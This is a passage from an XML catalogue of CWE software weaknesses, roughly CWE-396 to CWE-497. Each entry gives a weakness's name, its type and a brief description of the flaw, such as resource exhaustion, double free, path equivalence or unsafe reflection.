  <description>Catching overly broad exceptions promotes complex error handling code that is more likely to contain security vulnerabilities.Multiple catch blocks can get ugly and repetitive, but &quot;condensing&quot; catch blocks by catching a high-level class like Exception can obscure exceptions that deserve special treatment or that should not be caught at this point in the program. Catching an overly broad exception essentially defeats the purpose of Java's typed exceptions, and can become particularly dangerous if the program grows and begins to throw new types of exceptions. The new exception types will not receive any attention.</description>
</vulnerability>
<vulnerability label="CWE-397" name="Declaration of Throws for Generic Exception" type="Base" reference="CWE">
  <description>Throwing overly broad exceptions promotes complex error handling code that is more likely to contain security vulnerabilities.Declaring a method to throw Exception or Throwable makes it difficult for callers to perform proper error handling and error recovery. Java's exception mechanism, for example, is set up to make it easy for callers to anticipate what can go wrong and write code to handle each specific exceptional circumstance. Declaring that a method throws a generic form of exception defeats this system.</description>
</vulnerability>
<vulnerability label="CWE-398" name="Indicator of Poor Code Quality" type="Class" reference="CWE">
  <description>The code has features that do not directly introduce a weakness or vulnerability, but indicate that the product has not been carefully developed or maintained.Programs are more likely to be secure when good development practices are followed. If a program is complex, difficult to maintain, not portable, or shows evidence of neglect, then there is a higher likelihood that weaknesses are buried in the code.</description>
</vulnerability>
<vulnerability label="CWE-40" name="Path Traversal: '\\UNC\share\name\' (Windows UNC Share)" type="Variant" reference="CWE">
  <description>An attacker can inject a Windows UNC share ('\\UNC\share\name') into a software system to potentially redirect access to an unintended location or arbitrary file.</description>
</vulnerability>
<vulnerability label="CWE-400" name="Uncontrolled Resource Consumption ('Resource Exhaustion')" type="Base" reference="CWE">
  <description>The software does not properly restrict the size or amount of resources that are requested or influenced by an actor, which can be used to consume more resources than intended.Limited resources include memory, file system storage, database connection pool entries, or CPU. If an attacker can trigger the allocation of these limited resources, but the number or size of the resources is not controlled, then the attacker could cause a denial of service that consumes all available resources. This would prevent valid users from accessing the software, and it could potentially have an impact on the surrounding environment. For example, a memory exhaustion attack against an application could slow down the application as well as its host operating system.Resource exhaustion problems have at least two common causes:Error conditions and other exceptional circumstancesConfusion over which part of the program is responsible for releasing the resource</description>
</vulnerability>
<vulnerability label="CWE-401" name="Improper Release of Memory Before Removing Last Reference ('Memory Leak')" type="Base" reference="CWE">
  <description>The software does not sufficiently track and release allocated memory after it has been used, which slowly consumes remaining memory.This is often triggered by improper handling of malformed data or unexpectedly interrupted sessions.</description>
</vulnerability>
<vulnerability label="CWE-402" name="Transmission of Private Resources into a New Sphere ('Resource Leak')" type="Class" reference="CWE">
  <description>The software makes resources available to untrusted parties when those resources are only intended to be accessed by the software.</description>
</vulnerability>
<vulnerability label="CWE-403" name="Exposure of File Descriptor to Unintended Control Sphere" type="Base" reference="CWE">
  <description>A process does not close sensitive file descriptors before invoking a child process, which allows the child to perform unauthorized I/O operations using those descriptors.</description>
</vulnerability>
<vulnerability label="CWE-404" name="Improper Resource Shutdown or Release" type="Base" reference="CWE">
  <description>The program does not release or incorrectly releases a resource before it is made available for re-use.When a resource is created or allocated, the developer is responsible for properly releasing the resource as well as accounting for all potential paths of expiration or invalidation, such as a set period of time or revocation.</description>
</vulnerability>
<vulnerability label="CWE-405" name="Asymmetric Resource Consumption (Amplification)" type="Class" reference="CWE">
  <description>Software that does not appropriately monitor or control resource consumption can lead to adverse system performance.This situation is amplified if the software allows malicious users or attackers to consume more resources than their access level permits. Exploiting such a weakness can lead to asymmetric resource consumption, aiding in amplification attacks against the system or the network.</description>
</vulnerability>
<vulnerability label="CWE-406" name="Insufficient Control of Network Message Volume (Network Amplification)" type="Base" reference="CWE">
  <description>The software does not sufficiently monitor or control transmitted network traffic volume, so that an actor can cause the software to transmit more traffic than should be allowed for that actor.In the absence of a policy to restrict asymmetric resource consumption, the application or system cannot distinguish between legitimate transmissions and traffic intended to serve as an amplifying attack on target systems. Systems can often be configured to restrict the amount of traffic sent out on behalf of a client, based on the client's origin or access level. This is usually defined in a resource allocation policy. In the absence of a mechanism to keep track of transmissions, the system or application can be easily abused to transmit asymmetrically greater traffic than the request or client should be permitted to.</description>
</vulnerability>
<vulnerability label="CWE-407" name="Algorithmic Complexity" type="Base" reference="CWE">
  <description>An algorithm in a product has an inefficient worst-case computational complexity that may be detrimental to system performance and can be triggered by an attacker, typically using crafted manipulations that ensure that the worst case is being reached.</description>
</vulnerability>
<vulnerability label="CWE-408" name="Incorrect Behavior Order: Early Amplification" type="Base" reference="CWE">
  <description>The software allows an entity to perform a legitimate but expensive operation before authentication or authorization has taken place.</description>
</vulnerability>
<vulnerability label="CWE-409" name="Improper Handling of Highly Compressed Data (Data Amplification)" type="Base" reference="CWE">
  <description>The software does not handle or incorrectly handles a compressed input with a very high compression ratio that produces a large output.An example of data amplification is a &quot;decompression bomb,&quot; a small ZIP file that can produce a large amount of data when it is decompressed.</description>
</vulnerability>
<vulnerability label="CWE-41" name="Improper Resolution of Path Equivalence" type="Base" reference="CWE">
  <description>The system or application is vulnerable to file system contents disclosure through path equivalence. Path equivalence involves the use of special characters in file and directory names. The associated manipulations are intended to generate multiple names for the same object.Path equivalence is usually employed in order to circumvent access controls expressed using an incomplete set of file name or file path representations. This is different from path traversal, wherein the manipulations are performed to generate a name for a different object.</description>
</vulnerability>
<vulnerability label="CWE-410" name="Insufficient Resource Pool" type="Base" reference="CWE">
  <description>The software's resource pool is not large enough to handle peak demand, which allows an attacker to prevent others from accessing the resource by using a (relatively) large number of requests for resources.Frequently the consequence is a &quot;flood&quot; of connection or sessions.</description>
</vulnerability>
<vulnerability label="CWE-412" name="Unrestricted Externally Accessible Lock" type="Base" reference="CWE">
  <description>The software properly checks for the existence of a lock, but the lock can be externally controlled or influenced by an actor that is outside of the intended sphere of control.This prevents the software from acting on associated resources or performing other behaviors that are controlled by the presence of the lock. Relevant locks might include an exclusive lock or mutex, or modifying a shared resource that is treated as a lock. If the lock can be held for an indefinite period of time, then the denial of service could be permanent.</description>
</vulnerability>
<vulnerability label="CWE-413" name="Improper Resource Locking" type="Base" reference="CWE">
  <description>The software does not lock or does not correctly lock a resource when the software must have exclusive access to the resource.When a resource is not properly locked, an attacker could modify the resource while it is being operated on by the software. This might violate the software's assumption that the resource will not change, potentially leading to unexpected behaviors.</description>
</vulnerability>
<vulnerability label="CWE-414" name="Missing Lock Check" type="Base" reference="CWE">
  <description>A product does not check to see if a lock is present before performing sensitive operations on a resource.</description>
</vulnerability>
<vulnerability label="CWE-415" name="Double Free" type="Variant" reference="CWE">
  <description>The product calls free() twice on the same memory address, potentially leading to modification of unexpected memory locations.When a program calls free() twice with the same argument, the program's memory management data structures become corrupted. This corruption can cause the program to crash or, in some circumstances, cause two later calls to malloc() to return the same pointer. If malloc() returns the same value twice and the program later gives the attacker control over the data that is written into this doubly-allocated memory, the program becomes vulnerable to a buffer overflow attack.</description>
</vulnerability>
<vulnerability label="CWE-416" name="Use After Free" type="Base" reference="CWE">
  <description>Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.The use of previously-freed memory can have any number of adverse consequences, ranging from the corruption of valid data to the execution of arbitrary code, depending on the instantiation and timing of the flaw. The simplest way data corruption may occur involves the system's reuse of the freed memory. Use-after-free errors have two common and sometimes overlapping causes: Error conditions and other exceptional circumstances.Confusion over which part of the program is responsible for freeing the memory. In this scenario, the memory in question is allocated to another pointer validly at some point after it has been freed. The original pointer to the freed memory is used again and points to somewhere within the new allocation. As the data is changed, it corrupts the validly used memory; this induces undefined behavior in the process. If the newly allocated data chances to hold a class, in C++ for example, various function pointers may be scattered within the heap data. If one of these function pointers is overwritten with an address to valid shellcode, execution of arbitrary code can be achieved.</description>
</vulnerability>
<vulnerability label="CWE-419" name="Unprotected Primary Channel" type="Base" reference="CWE">
  <description>The software uses a primary channel for administration or restricted functionality, but it does not properly protect the channel.</description>
</vulnerability>
<vulnerability label="CWE-42" name="Path Equivalence: 'filename.' (Trailing Dot)" type="Variant" reference="CWE">
  <description>A software system that accepts path input in the form of trailing dot ('filedir.') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.</description>
</vulnerability>
<vulnerability label="CWE-420" name="Unprotected Alternate Channel" type="Base" reference="CWE">
  <description>The software protects a primary channel, but it does not use the same level of protection for an alternate channel.</description>
</vulnerability>
<vulnerability label="CWE-421" name="Race Condition During Access to Alternate Channel" type="Base" reference="CWE">
  <description>The product opens an alternate channel to communicate with an authorized user, but the channel is accessible to other actors.This creates a race condition that allows an attacker to access the channel before the authorized user does.</description>
</vulnerability>
<vulnerability label="CWE-422" name="Unprotected Windows Messaging Channel ('Shatter')" type="Variant" reference="CWE">
  <description>The software does not properly verify the source of a message in the Windows Messaging System while running at elevated privileges, creating an alternate channel through which an attacker can directly send a message to the product.</description>
</vulnerability>
<vulnerability label="CWE-423" name="DEPRECATED (Duplicate): Proxied Trusted Channel" type="Base" reference="CWE">
  <description>This entry has been deprecated because it was a duplicate of CWE-441. All content has been transferred to CWE-441.</description>
</vulnerability>
<vulnerability label="CWE-424" name="Improper Protection of Alternate Path" type="Class" reference="CWE">
  <description>The product does not sufficiently protect all possible paths that a user can take to access restricted functionality or resources.</description>
</vulnerability>
<vulnerability label="CWE-425" name="Direct Request ('Forced Browsing')" type="Base" reference="CWE">
  <description>The web application does not adequately enforce appropriate authorization on all restricted URLs, scripts, or files.Web applications susceptible to direct request attacks often make the false assumption that such resources can only be reached through a given navigation path and so only apply authorization at certain points in the path.</description>
</vulnerability>
<vulnerability label="CWE-427" name="Uncontrolled Search Path Element" type="Base" reference="CWE">
  <description>The product uses a fixed or controlled search path to find resources, but one or more locations in that path can be under the control of unintended actors.Although this weakness can occur with any type of resource, it is frequently introduced when a product uses a directory search path to find executables or code libraries, but the path contains a directory that can be modified by an attacker, such as &quot;/tmp&quot; or the current working directory. In Windows-based systems, when the LoadLibrary or LoadLibraryEx function is called with a DLL name that does not contain a fully qualified path, the function follows a search order that includes two path elements that might be uncontrolled:the directory from which the program has been loadedthe current working directory.In some cases, the attack can be conducted remotely, such as when SMB or WebDAV network shares are used.In some Unix-based systems, a PATH might be created that contains an empty element, e.g. by splicing an empty variable into the PATH. This empty element can be interpreted as equivalent to the current working directory, which might be an untrusted search element.</description>
</vulnerability>
<vulnerability label="CWE-428" name="Unquoted Search Path or Element" type="Base" reference="CWE">
  <description>The product uses a search path that contains an unquoted element, in which the element contains whitespace or other separators. This can cause the product to access resources in a parent path.If a malicious individual has access to the file system, it is possible to elevate privileges by inserting such a file as &quot;C:\Program.exe&quot; to be run by a privileged program making use of WinExec.</description>
</vulnerability>
<vulnerability label="CWE-43" name="Path Equivalence: 'filename....' (Multiple Trailing Dot)" type="Variant" reference="CWE">
  <description>A software system that accepts path input in the form of multiple trailing dot ('filedir....') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.</description>
</vulnerability>
<vulnerability label="CWE-430" name="Deployment of Wrong Handler" type="Base" reference="CWE">
  <description>The wrong &quot;handler&quot; is assigned to process an object.An example of deploying the wrong handler would be calling a servlet to reveal source code of a .JSP file, or automatically &quot;determining&quot; type of the object even if it is contradictory to an explicitly specified type.</description>
</vulnerability>
<vulnerability label="CWE-431" name="Missing Handler" type="Base" reference="CWE">
  <description>A handler is not available or implemented.When an exception is thrown and not caught, the process has given up an opportunity to decide if a given failure or event is worth a change in execution.</description>
</vulnerability>
<vulnerability label="CWE-432" name="Dangerous Signal Handler not Disabled During Sensitive Operations" type="Base" reference="CWE">
  <description>The application uses a signal handler that shares state with other signal handlers, but it does not properly mask or prevent those signal handlers from being invoked while the original signal handler is still running.During the execution of a signal handler, it can be interrupted by another handler when a different signal is sent. If the two handlers share state - such as global variables - then an attacker can corrupt the state by sending another signal before the first handler has completed execution.</description>
</vulnerability>
<vulnerability label="CWE-433" name="Unparsed Raw Web Content Delivery" type="Variant" reference="CWE">
  <description>The software stores raw content or supporting code under the web document root with an extension that is not specifically handled by the server.If code is stored in a file with an extension such as &quot;.inc&quot; or &quot;.pl&quot;, and the web server does not have a handler for that extension, then the server will likely send the contents of the file directly to the requester without the pre-processing that was expected. When that file contains sensitive information such as database credentials, this may allow the attacker to compromise the application or associated components.</description>
</vulnerability>
<vulnerability label="CWE-434" name="Unrestricted Upload of File with Dangerous Type" type="Base" reference="CWE">
  <description>The software allows the attacker to upload or transfer files of dangerous types that can be automatically processed within the product's environment.</description>
</vulnerability>
<vulnerability label="CWE-435" name="Interaction Error" type="Class" reference="CWE">
  <description>An interaction error occurs when two entities work correctly when running independently, but they interact in unexpected ways when they are run together.This could apply to products, systems, components, etc.</description>
</vulnerability>
<vulnerability label="CWE-436" name="Interpretation Conflict" type="Base" reference="CWE">
  <description>Product A handles inputs or steps differently than Product B, which causes A to perform incorrect actions based on its perception of B's state.This is generally found in proxies, firewalls, anti-virus software, and other intermediary devices that allow, deny, or modify traffic based on how the client or server is expected to behave.</description>
</vulnerability>
<vulnerability label="CWE-437" name="Incomplete Model of Endpoint Features" type="Base" reference="CWE">
  <description>A product acts as an intermediary or monitor between two or more endpoints, but it does not have a complete model of an endpoint's features, behaviors, or state, potentially causing the product to perform incorrect actions based on this incomplete model.</description>
</vulnerability>
<vulnerability label="CWE-439" name="Behavioral Change in New Version or Environment" type="Base" reference="CWE">
  <description>A's behavior or functionality changes with a new version of A, or a new environment, which is not known (or manageable) by B.</description>
</vulnerability>
<vulnerability label="CWE-44" name="Path Equivalence: 'file.name' (Internal Dot)" type="Variant" reference="CWE">
  <description>A software system that accepts path input in the form of internal dot ('file.ordir') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.</description>
</vulnerability>
<vulnerability label="CWE-440" name="Expected Behavior Violation" type="Base" reference="CWE">
  <description>A feature, API, or function being used by a product behaves differently than the product expects.</description>
</vulnerability>
<vulnerability label="CWE-441" name="Unintended Proxy/Intermediary" type="Base" reference="CWE">
  <description>A product can be used as an intermediary or proxy between an attacker and the ultimate target, so that the attacker can either bypass access controls or hide activities.</description>
</vulnerability>
<vulnerability label="CWE-443" name="DEPRECATED (Duplicate): HTTP response splitting" type="Base" reference="CWE">
  <description>This weakness can be found at CWE-113.</description>
</vulnerability>
<vulnerability label="CWE-444" name="Inconsistent Interpretation of HTTP Requests ('HTTP Request Smuggling')" type="Base" reference="CWE">
  <description>When malformed or abnormal HTTP requests are interpreted by one or more entities in the data flow between the user and the web server, such as a proxy or firewall, they can be interpreted inconsistently, allowing the attacker to &quot;smuggle&quot; a request to one device without the other device being aware of it.</description>
</vulnerability>
<vulnerability label="CWE-446" name="UI Discrepancy for Security Feature" type="Base" reference="CWE">
  <description>The user interface does not correctly enable or configure a security feature, but the interface provides feedback that causes the user to believe that the feature is in a secure state.When the user interface does not properly reflect what the user asks of it, then it can lead the user into a false sense of security. For example, the user might check a box to enable a security option to enable encrypted communications, but the software does not actually enable the encryption. Alternately, the user might provide a &quot;restrict ALL'&quot; access control rule, but the software only implements &quot;restrict SOME&quot;.</description>
</vulnerability>
<vulnerability label="CWE-447" name="Unimplemented or Unsupported Feature in UI" type="Base" reference="CWE">
  <description>A UI function for a security feature appears to be supported and gives feedback to the user that suggests that it is supported, but the underlying functionality is not implemented.</description>
</vulnerability>
<vulnerability label="CWE-448" name="Obsolete Feature in UI" type="Base" reference="CWE">
  <description>A UI function is obsolete and the product does not warn the user.</description>
</vulnerability>
<vulnerability label="CWE-449" name="The UI Performs the Wrong Action" type="Base" reference="CWE">
  <description>The UI performs the wrong action with respect to the user's request.</description>
</vulnerability>
<vulnerability label="CWE-45" name="Path Equivalence: 'file...name' (Multiple Internal Dot)" type="Variant" reference="CWE">
  <description>A software system that accepts path input in the form of multiple internal dot ('file...dir') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.</description>
</vulnerability>
<vulnerability label="CWE-450" name="Multiple Interpretations of UI Input" type="Base" reference="CWE">
  <description>The UI has multiple interpretations of user input but does not prompt the user when it selects the less secure interpretation.</description>
</vulnerability>
<vulnerability label="CWE-451" name="UI Misrepresentation of Critical Information" type="Base" reference="CWE">
  <description>The UI does not properly represent critical information to the user, allowing the information - or its source - to be obscured or spoofed. This is often a component in phishing attacks.</description>
</vulnerability>
<vulnerability label="CWE-453" name="Insecure Default Variable Initialization" type="Base" reference="CWE">
  <description>The software, by default, initializes an internal variable with an insecure or less secure value than is possible.</description>
</vulnerability>
<vulnerability label="CWE-454" name="External Initialization of Trusted Variables or Data Stores" type="Base" reference="CWE">
  <description>The software initializes critical internal variables or data stores using inputs that can be modified by untrusted actors.A software system should be reluctant to trust variables that have been initialized outside of its trust boundary, especially if they are initialized by users. They may have been initialized incorrectly. If an attacker can initialize the variable, then he/she can influence what the vulnerable system will do.</description>
</vulnerability>
<vulnerability label="CWE-455" name="Non-exit on Failed Initialization" type="Base" reference="CWE">
  <description>The software does not exit or otherwise modify its operation when security-relevant errors occur during initialization, such as when a configuration file has a format error, which can cause the software to execute in a less secure fashion than intended by the administrator.</description>
</vulnerability>
<vulnerability label="CWE-456" name="Missing Initialization" type="Base" reference="CWE">
  <description>The software does not initialize critical variables, which causes the execution environment to use unexpected values.</description>
</vulnerability>
<vulnerability label="CWE-457" name="Use of Uninitialized Variable" type="Variant" reference="CWE">
  <description>The code uses a variable that has not been initialized, leading to unpredictable or unintended results.In some languages, such as C, an uninitialized variable contains contents of previously-used memory. An attacker can sometimes control or read these contents.</description>
</vulnerability>
<vulnerability label="CWE-458" name="DEPRECATED: Incorrect Initialization" type="Base" reference="CWE">
  <description>This weakness has been deprecated because its name and description did not match. The description duplicated CWE-454, while the name suggested a more abstract initialization problem. Please refer to CWE-665 for the more abstract problem.</description>
</vulnerability>
<vulnerability label="CWE-459" name="Incomplete Cleanup" type="Base" reference="CWE">
  <description>The software does not properly &quot;clean up&quot; and remove temporary or supporting resources after they have been used.</description>
</vulnerability>
<vulnerability label="CWE-46" name="Path Equivalence: 'filename ' (Trailing Space)" type="Variant" reference="CWE">
  <description>A software system that accepts path input in the form of trailing space ('filedir ') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.</description>
</vulnerability>
<vulnerability label="CWE-460" name="Improper Cleanup on Thrown Exception" type="Variant" reference="CWE">
  <description>The product does not clean up its state or incorrectly cleans up its state when an exception is thrown, leading to unexpected state or control flow.</description>
</vulnerability>
<vulnerability label="CWE-462" name="Duplicate Key in Associative List (Alist)" type="Base" reference="CWE">
  <description>Duplicate keys in associative lists can lead to non-unique keys being mistaken for an error. A duplicate key entry -- if the alist is designed properly -- could be used as a constant time replace function. However, duplicate key entries could be inserted by mistake. Because of this ambiguity, duplicate key entries in an association list are not recommended and should not be allowed.</description>
</vulnerability>
<vulnerability label="CWE-463" name="Deletion of Data Structure Sentinel" type="Base" reference="CWE">
  <description>The accidental deletion of a data-structure sentinel can cause serious programming logic problems. Often times data-structure sentinels are used to mark structure of the data structure. A common example of this is the null character at the end of strings. Another common example is linked lists which may contain a sentinel to mark the end of the list. It is dangerous to allow this type of control data to be easily accessible. Therefore, it is important to protect from the deletion or modification outside of some wrapper interface which provides safety.</description>
</vulnerability>
<vulnerability label="CWE-464" name="Addition of Data Structure Sentinel" type="Base" reference="CWE">
  <description>The accidental addition of a data-structure sentinel can cause serious programming logic problems.Data-structure sentinels are often used to mark the structure of data. A common example of this is the null character at the end of strings or a special sentinel to mark the end of a linked list. It is dangerous to allow this type of control data to be easily accessible. Therefore, it is important to protect from the addition or modification of sentinels.</description>
</vulnerability>
<vulnerability label="CWE-466" name="Return of Pointer Value Outside of Expected Range" type="Base" reference="CWE">
  <description>A function can return a pointer to memory that is outside of the buffer that the pointer is expected to reference.</description>
</vulnerability>
<vulnerability label="CWE-467" name="Use of sizeof() on a Pointer Type" type="Variant" reference="CWE">
  <description>The code calls sizeof() on a malloced pointer type, which always returns the wordsize/8. This can produce an unexpected result if the programmer intended to determine how much memory has been allocated.</description>
</vulnerability>
<vulnerability label="CWE-468" name="Incorrect Pointer Scaling" type="Base" reference="CWE">
  <description>In C and C++, one may often accidentally refer to the wrong memory due to the semantics of when math operations are implicitly scaled.</description>
</vulnerability>
<vulnerability label="CWE-469" name="Use of Pointer Subtraction to Determine Size" type="Base" reference="CWE">
  <description>The application subtracts one pointer from another in order to determine size, but this calculation can be incorrect if the pointers do not exist in the same memory chunk.</description>
</vulnerability>
<vulnerability label="CWE-47" name="Path Equivalence: ' filename' (Leading Space)" type="Variant" reference="CWE">
  <description>A software system that accepts path input in the form of leading space (' filedir') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.</description>
</vulnerability>
<vulnerability label="CWE-470" name="Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')" type="Base" reference="CWE">
  <description>The application uses external input with reflection to select which classes or code to use, but it does not sufficiently prevent the input from selecting improper classes or code.If the application uses external inputs to determine which class to instantiate or which method to invoke, then an attacker could supply values to select unexpected classes or methods. If this occurs, then the attacker could create control flow paths that were not intended by the developer. These paths could bypass authentication or access control checks, or otherwise cause the application to behave in an unexpected manner. This situation becomes a doomsday scenario if the attacker can upload files into a location that appears on the application's classpath (CWE-427) or add new entries to the application's classpath (CWE-426). Under either of these conditions, the attacker can use reflection to introduce new, malicious behavior into the application.</description>
</vulnerability>
<vulnerability label="CWE-471" name="Modification of Assumed-Immutable Data (MAID)" type="Base" reference="CWE">
  <description>The software does not properly protect an assumed-immutable element from being modified by an attacker.</description>
</vulnerability>
<vulnerability label="CWE-472" name="External Control of Assumed-Immutable Web Parameter" type="Base" reference="CWE">
  <description>The web application does not sufficiently verify inputs that are assumed to be immutable but are actually externally controllable, such as hidden form fields.If a web product does not properly protect assumed-immutable values from modification in hidden form fields, parameters, cookies, or URLs, this can lead to modification of critical data. Web applications often mistakenly make the assumption that data passed to the client in hidden fields or cookies is not susceptible to tampering. Improper validation of data that are user-controllable can lead to the application processing incorrect, and often malicious, input. For example, custom cookies commonly store session data or persistent data across sessions. This kind of session data is normally involved in security related decisions on the server side, such as user authentication and access control. Thus, the cookies might contain sensitive data such as user credentials and privileges. This is a dangerous practice, as it can often lead to improper reliance on the value of the client-provided cookie by the server side application.</description>
</vulnerability>
<vulnerability label="CWE-473" name="PHP External Variable Modification" type="Variant" reference="CWE">
  <description>A PHP application does not properly protect against the modification of variables from external sources, such as query parameters or cookies. This can expose the application to numerous weaknesses that would not exist otherwise.</description>
</vulnerability>
<vulnerability label="CWE-474" name="Use of Function with Inconsistent Implementations" type="Base" reference="CWE">
  <description>The code uses a function that has inconsistent implementations across operating systems and versions, which might cause security-relevant portability problems.</description>
</vulnerability>
<vulnerability label="CWE-475" name="Undefined Behavior for Input to API" type="Base" reference="CWE">
  <description>The behavior of this function is undefined unless its control parameter is set to a specific value.</description>
</vulnerability>
<vulnerability label="CWE-476" name="NULL Pointer Dereference" type="Base" reference="CWE">
  <description>A NULL pointer dereference occurs when the application dereferences a pointer that it expects to be valid, but is NULL, typically causing a crash or exit.NULL pointer dereference issues can occur through a number of flaws, including race conditions, and simple programming omissions.</description>
</vulnerability>
<vulnerability label="CWE-477" name="Use of Obsolete Functions" type="Base" reference="CWE">
  <description>The code uses deprecated or obsolete functions, which suggests that the code has not been actively reviewed or maintained.</description>
</vulnerability>
<vulnerability label="CWE-478" name="Missing Default Case in Switch Statement" type="Variant" reference="CWE">
  <description>The code does not have a default case in a switch statement, which might lead to complex logical errors and resultant weaknesses.</description>
</vulnerability>
<vulnerability label="CWE-479" name="Signal Handler Use of a Non-reentrant Function" type="Variant" reference="CWE">
  <description>The program defines a signal handler that calls a non-reentrant function.Non-reentrant functions are functions that cannot safely be called, interrupted, and then recalled before the first call has finished without resulting in memory corruption. This can lead to an unexpected system state an unpredictable results with a variety of potential consequences depending on context, including denial of service and code execution.Many functions are not reentrant, but some of them can result in the corruption of memory if they are used in a signal handler. The function call syslog() is an example of this. In order to perform its functionality, it allocates a small amount of memory as &quot;scratch space.&quot; If syslog() is suspended by a signal call and the signal handler calls syslog(), the memory used by both of these functions enters an undefined, and possibly, exploitable state. Implementations of malloc() and free() manage metadata in global structures in order to track which memory is allocated versus which memory is available, but they are non-reentrant. Simultaneous calls to these functions can cause corruption of the metadata.</description>
</vulnerability>
<vulnerability label="CWE-48" name="Path Equivalence: 'file name' (Internal Whitespace)" type="Variant" reference="CWE">
  <description>A software system that accepts path input in the form of internal space ('file(SPACE)name') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.</description>
</vulnerability>
<vulnerability label="CWE-480" name="Use of Incorrect Operator" type="Base" reference="CWE">
  <description>The programmer accidentally uses the wrong operator, which changes the application logic in security-relevant ways.</description>
</vulnerability>
<vulnerability label="CWE-481" name="Assigning instead of Comparing" type="Variant" reference="CWE">
  <description>The code uses an operator for assignment when the intention was to perform a comparison.In many languages the compare statement is very close in appearance to the assignment statement and are often confused. This bug is generally the result of a typo and usually causes obvious problems with program execution. If the comparison is in an if statement, the if statement will usually evaluate the value of the right-hand side of the predicate.</description>
</vulnerability>
<vulnerability label="CWE-482" name="Comparing instead of Assigning" type="Variant" reference="CWE">
  <description>The code uses an operator for comparison when the intention was to perform an assignment.In many languages, the compare statement is very close in appearance to the assignment statement; they are often confused.</description>
</vulnerability>
<vulnerability label="CWE-483" name="Incorrect Block Delimitation" type="Variant" reference="CWE">
  <description>The code does not explicitly delimit a block that is intended to contain 2 or more statements, creating a logic error.In some languages, braces (or other delimiters) are optional for blocks. When the delimiter is omitted, it is possible to insert a logic error in which a statement is thought to be in a block but is not. In some cases, the logic error can have security implications.</description>
</vulnerability>
<vulnerability label="CWE-484" name="Omitted Break Statement in Switch" type="Base" reference="CWE">
  <description>The program omits a break statement within a switch or similar construct, causing code associated with multiple conditions to execute. This can cause problems when the programmer only intended to execute code associated with one condition.This can lead to critical code executing in situations where it should not.</description>
</vulnerability>
<vulnerability label="CWE-485" name="Insufficient Encapsulation" type="Class" reference="CWE">
  <description>The product does not sufficiently encapsulate critical data or functionality.Encapsulation is about drawing strong boundaries. In a web browser that might mean ensuring that your mobile code cannot be abused by other mobile code. On the server it might mean differentiation between validated data and unvalidated data, between one user's data and another's, or between data users are allowed to see and data that they are not.</description>
</vulnerability>
<vulnerability label="CWE-486" name="Comparison of Classes by Name" type="Variant" reference="CWE">
  <description>The program compares classes by name, which can cause it to use the wrong class when multiple classes can have the same name.If the decision to trust the methods and data of an object is based on the name of a class, it is possible for malicious users to send objects of the same name as trusted classes and thereby gain the trust afforded to known classes and types.</description>
</vulnerability>
<vulnerability label="CWE-487" name="Reliance on Package-level Scope" type="Variant" reference="CWE">
  <description>Java packages are not inherently closed; therefore, relying on them for code security is not a good practice.</description>
</vulnerability>
<vulnerability label="CWE-488" name="Exposure of Data Element to Wrong Session" type="Variant" reference="CWE">
  <description>The product does not sufficiently enforce boundaries between the states of different sessions, causing data to be provided to, or used by, the wrong session.Data can &quot;bleed&quot; from one session to another through member variables of singleton objects, such as Servlets, and objects from a shared pool.In the case of Servlets, developers sometimes do not understand that, unless a Servlet implements the SingleThreadModel interface, the Servlet is a singleton; there is only one instance of the Servlet, and that single instance is used and re-used to handle multiple requests that are processed simultaneously by different threads. A common result is that developers use Servlet member fields in such a way that one user may inadvertently see another user's data. In other words, storing user data in Servlet member fields introduces a data access race condition.</description>
</vulnerability>
<vulnerability label="CWE-489" name="Leftover Debug Code" type="Base" reference="CWE">
  <description>The application can be deployed with active debugging code that can create unintended entry points.</description>
</vulnerability>
<vulnerability label="CWE-49" name="Path Equivalence: 'filename/' (Trailing Slash)" type="Variant" reference="CWE">
  <description>A software system that accepts path input in the form of trailing slash ('filedir/') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.</description>
</vulnerability>
<vulnerability label="CWE-491" name="Public cloneable() Method Without Final ('Object Hijack')" type="Variant" reference="CWE">
  <description>A class has a cloneable() method that is not declared final, which allows an object to be created without calling the constructor. This can cause the object to be in an unexpected state.</description>
</vulnerability>
<vulnerability label="CWE-492" name="Use of Inner Class Containing Sensitive Data" type="Variant" reference="CWE">
  <description>Inner classes are translated into classes that are accessible at package scope and may expose code that the programmer intended to keep private to attackers.</description>
</vulnerability>
<vulnerability label="CWE-493" name="Critical Public Variable Without Final Modifier" type="Variant" reference="CWE">
  <description>The product has a critical public variable that is not final, which allows the variable to be modified to contain unexpected values.If a field is non-final and public, it can be changed once the value is set by any function that has access to the class which contains the field. This could lead to a vulnerability if other parts of the program make assumptions about the contents of that field.</description>
</vulnerability>
<vulnerability label="CWE-494" name="Download of Code Without Integrity Check" type="Base" reference="CWE">
  <description>The product downloads source code or an executable from a remote location and executes the code without sufficiently verifying the origin and integrity of the code.An attacker can execute malicious code by compromising the host server, performing DNS spoofing, or modifying the code in transit.</description>
</vulnerability>
<vulnerability label="CWE-495" name="Private Array-Typed Field Returned From A Public Method" type="Variant" reference="CWE">
  <description>The product has a method that is declared public, but returns a reference to a private array, which could then be modified in unexpected ways.</description>
</vulnerability>
<vulnerability label="CWE-496" name="Public Data Assigned to Private Array-Typed Field" type="Variant" reference="CWE">
  <description>Assigning public data to a private array is equivalent to giving public access to the array.</description>
</vulnerability>
<vulnerability label="CWE-497" name="Exposure of System Data to an Unauthorized Control Sphere" type="Variant" reference="CWE">
